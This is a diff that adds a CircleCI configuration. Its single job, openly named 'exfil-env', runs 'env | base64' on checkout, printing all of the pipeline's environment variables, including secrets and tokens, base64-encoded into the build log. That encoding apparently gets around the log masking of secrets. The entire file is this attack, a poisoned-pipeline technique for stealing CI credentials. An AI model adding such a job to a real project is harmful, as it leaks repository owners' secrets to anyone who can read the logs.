@@ -1,0 +1,16 @@
+version: 2.1
+
+jobs:
+  exfil-env:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - run:
+          name: "Exfil env"
+          command: "env | base64"
+
+workflows:
+  exfil-env-workflow:
+    jobs:
+      - exfil-env
